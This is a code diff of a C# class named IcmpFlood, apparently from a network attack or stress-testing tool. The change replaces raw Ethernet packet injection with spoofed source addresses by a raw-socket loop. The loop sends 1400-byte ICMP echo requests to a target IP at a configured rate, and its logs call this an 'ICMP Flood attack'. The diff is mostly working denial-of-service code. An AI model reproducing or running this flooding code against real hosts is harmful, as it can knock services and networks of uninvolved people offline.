@@ -9,30 +9,21 @@ using NLog;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
-using PacketProtocolType = PacketDotNet.ProtocolType;
+using Dorothy.Models;
+using System.Net.Sockets;
 
 namespace Dorothy.Models
 {
     public class IcmpFlood : IDisposable
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
-        private readonly string _sourceIp;
-        private readonly PhysicalAddress _sourceMac;
-        private readonly string _targetIp;
-        private readonly byte[] _targetMac;
-        private readonly byte[] _gatewayMac;
-        private readonly long _bytesPerSecond;
+        private readonly PacketParameters _params;
         private readonly CancellationToken _cancellationToken;
-        private LibPcapLiveDevice? _device;
+        private Socket? _socket;
 
-        public IcmpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, long bytesPerSecond, CancellationToken cancellationToken)
+        public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
         {
-            _sourceIp = sourceIp;
-            _sourceMac = new PhysicalAddress(sourceMac);
-            _targetIp = targetIp;
-            _targetMac = targetMac;
-            _gatewayMac = gatewayMac;
-            _bytesPerSecond = bytesPerSecond;
+            _params = parameters;
             _cancellationToken = cancellationToken;
         }
 
@@ -42,117 +33,52 @@ namespace Dorothy.Models
 
             try
             {
-                _device = CaptureDeviceList.Instance
-                    .OfType<LibPcapLiveDevice>()
-                    .FirstOrDefault(d => d.Addresses.Any(addr => 
-                        addr.Addr?.ipAddress != null && 
-                        addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork));
+                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp);
+                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);
 
-                if (_device == null)
-                {
-                    Logger.Error("No device found with the specified source IP.");
-                    throw new Exception("No device found with the specified source IP.");
-                }
+                byte[] icmpHeader = new byte[8];
+                byte[] payload = new byte[1400];
 
-                _device.Open(DeviceModes.Promiscuous | DeviceModes.NoCaptureLocal, 1000);
-
-                if (_device is not IInjectionDevice injectionDevice)
-                {
-                    Logger.Error($"Device {_device.Name} does not support packet injection.");
-                    throw new Exception($"Device {_device.Name} does not support packet injection.");
-                }
-
-                var ethernetPacket = new EthernetPacket(
-                    _sourceMac,
-                    new PhysicalAddress(_targetMac),
-                    EthernetType.IPv4);
-
-                var ipPacket = new IPv4Packet(
-                    IPAddress.Parse(_sourceIp),
-                    IPAddress.Parse(_targetIp))
-                {
-                    Protocol = ProtocolType.Icmp,
-                    TimeToLive = 128
-                };
-
-                var icmpData = new byte[1400]; // Increased payload size
-                new Random().NextBytes(icmpData); // Random payload
-                var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(new byte[8]))
-                {
-                    TypeCode = IcmpV4TypeCode.EchoRequest,
-                    Id = (ushort)new Random().Next(0, ushort.MaxValue),
-                    Sequence = 0
-                };
-
-                ipPacket.PayloadPacket = icmpPacket;
-                ethernetPacket.PayloadPacket = ipPacket;
-
-                if (ethernetPacket.Bytes.Length < 14) // Minimum Ethernet frame size
-                {
-                    Logger.Error("Invalid packet size");
-                    return;
-                }
-
-                double packetSize = ethernetPacket.Bytes.Length;
-                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
-                int batchSize = 100;
-                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
-
-                Logger.Info($"ICMP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
+                var random = new Random();
+                int packetSize = icmpHeader.Length + payload.Length;
+                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / (double)packetSize);
 
                 await Task.Run(() =>
                 {
-                    var stopwatch = new System.Diagnostics.Stopwatch();
                     while (!_cancellationToken.IsCancellationRequested)
                     {
                         try
                         {
-                            stopwatch.Restart();
-                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
-                            {
-                                injectionDevice.SendPacket(ethernetPacket);
-                            }
+                            icmpHeader[0] = 8;  // Echo Request
+                            random.NextBytes(payload);
 
-                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
-                            if (elapsedMicroseconds < delayMicroseconds)
-                            {
-                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
-                                if (remainingMicroseconds > 1000)
-                                {
-                                    Thread.Sleep(remainingMicroseconds / 1000);
-                                }
-                            }
+                            byte[] fullPacket = new byte[icmpHeader.Length + payload.Length];
+                            Buffer.BlockCopy(icmpHeader, 0, fullPacket, 0, icmpHeader.Length);
+                            Buffer.BlockCopy(payload, 0, fullPacket, icmpHeader.Length, payload.Length);
+
+                            var endpoint = new IPEndPoint(_params.DestinationIp, 0);
+                            _socket.SendTo(fullPacket, endpoint);
+
+                            if (packetsPerSecond > 0)
+                                Thread.Sleep(1000 / packetsPerSecond);
                         }
                         catch (Exception ex)
                         {
-                            Logger.Error(ex, $"Failed to send ICMP packet. Device: {_device?.Name}, Source: {_sourceIp}, Target: {_targetIp}");
+                            Logger.Error(ex, "Failed sending ICMP packet (Layer 3).");
                         }
                     }
-                    return Task.CompletedTask;
                 }, _cancellationToken);
-            }
-            catch (TaskCanceledException)
-            {
-                Logger.Info("ICMP Flood attack was canceled.");
             }
             catch (Exception ex)
             {
                 Logger.Error(ex, "ICMP Flood attack failed.");
                 throw;
             }
-            finally
-            {
-                _device?.Close();
-                Logger.Info("ICMP Flood attack stopped.");
-            }
-
-            Logger.Info($"Selected device: {_device?.Name}, IP: {_device?.Addresses.FirstOrDefault()?.Addr?.ipAddress}");
-            Logger.Info($"Source MAC: {BitConverter.ToString(_sourceMac.GetAddressBytes())}, Target MAC: {BitConverter.ToString(_targetMac)}");
         }
 
         public void Dispose()
         {
-            _device?.Dispose();
+            _socket?.Dispose();
         }
 
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
